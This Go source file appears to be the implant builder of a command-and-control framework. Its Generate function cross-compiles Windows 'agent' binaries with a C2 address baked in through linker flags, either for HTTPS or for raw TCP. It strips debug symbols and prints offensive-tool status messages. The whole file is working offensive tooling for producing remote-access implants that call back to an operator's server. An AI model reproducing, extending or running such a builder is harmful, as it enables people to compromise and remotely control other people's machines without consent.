package agent

import (
	"fmt"
	"net"
	"os"
	"os/exec"
)

func Generate(protocol, output, c2Addr string) {
	var buildPath string
	var ldflags string

	switch protocol {
	case "https":
		buildPath = "./agent/https"
		ldflags = fmt.Sprintf("-s -w -X main.defaultC2=%s", c2Addr)
	case "rawtcp":
		buildPath = "./agent/rawtcp"
		host, port, err := net.SplitHostPort(c2Addr)
		if err != nil {
			fmt.Println("[-] Invalid C2 format. Use host:port")
			return
		}
		ldflags = fmt.Sprintf("-s -w -X main.defaultHost=%s -X main.defaultPort=%s", host, port)
	default:
		fmt.Println("[-] Unknown protocol", protocol)
		return
	}

	fmt.Println("[+] Building agent:", protocol)

	cmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", output, buildPath)
	cmd.Env = append(os.Environ(),
		"GOOS=windows",
		"GOARCH=amd64",
	)

	if err := cmd.Run(); err != nil {
		fmt.Println("[-] Build failed:", err)
		return
	}
	fmt.Println("[+] Agent built successfully:", output)
}
